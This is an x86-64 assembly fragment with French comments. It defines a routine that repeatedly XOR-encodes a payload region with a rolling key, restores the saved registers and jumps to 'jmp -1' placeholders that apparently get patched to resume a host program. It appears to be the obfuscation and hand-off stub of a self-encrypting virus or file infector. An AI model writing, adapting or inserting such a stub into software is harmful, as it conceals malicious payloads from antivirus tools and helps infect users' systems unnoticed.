global ft_end

ft_end:
mov r9, 8 ; NB_TIMING MOODULABLE
loop2_ft_end:
	xor edx, edx
	mov eax, 0x170F ; taille du payload
	mov ecx, 4
	div ecx
	mul ecx
	mov ecx, eax
	sub ecx, DWORD 4
	mov rdi, rbx ; debut du payload
	sub r15, r14
	cld
loop1_ft_end:
	mov eax, DWORD [rdi]
	xor rax, r15
	stosd
	add r15d, DWORD [rdi - 4]
 	sub ecx, 4
	cmp ecx, 0
	jg loop1_ft_end
	dec r9
	test r9, r9
	jne loop2_ft_end
end_ft_end:
	pop r15
	pop r15
	pop r14
	pop r13
	pop r12
	pop r11
	pop r10
	pop r9
	pop r8
	pop rdx
	pop rcx
	pop rax
	pop rsi
	pop rdi
	mov rsp, rbp
	pop rbp
	add rsp, 8
	cmp DWORD [rsp - 8], 5
	je jmp1
	cmp DWORD [rsp - 8], 4
	je jmp2
	cmp DWORD [rsp - 8], 3
	je jmp3
	cmp DWORD [rsp - 8], 2
	je jmp4
	cmp DWORD [rsp - 8], 1
	je jmp5
jmp1:
	jmp -1
jmp2:
	jmp -1
jmp3:
	jmp -1
jmp4:
	jmp -1
jmp5:
	jmp -1
